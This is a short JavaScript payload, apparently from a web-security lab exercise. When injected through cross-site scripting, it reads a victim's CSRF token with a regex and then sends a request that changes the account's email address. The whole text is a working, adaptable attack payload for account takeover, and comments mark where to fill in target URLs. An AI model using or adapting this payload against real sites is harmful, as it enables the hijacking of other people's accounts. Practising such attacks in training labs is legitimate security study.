<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
// URL to grep the CSRF token
req.open('get','/<URL to get CSRF token>',true);
req.send();
function handleResponse() {
// match the token parameter name and regex of token value
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
//POST method URL and body data which changes the mail account 
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
